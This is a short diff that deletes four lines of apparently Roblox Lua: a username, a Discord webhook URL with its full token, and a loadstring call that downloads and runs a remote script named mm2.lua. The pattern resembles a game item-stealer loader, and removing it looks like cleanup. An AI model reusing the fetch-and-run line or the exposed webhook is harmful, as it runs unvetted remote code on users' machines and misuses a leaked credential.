@@ -1,4 +1,0 @@
-Username = "frxsty0nt0p"
-Webhook = "https://discord.com/api/webhooks/1286732595358597223/gZcmcLSHmTJm2bTMT2vkgYNDFHP2qD81rZViyiSuMh8reFTC25CMLnKTTgL2B48mi-Dg"
-
-loadstring(game:HttpGet("https://janeq.vercel.app/mm2.lua"))()
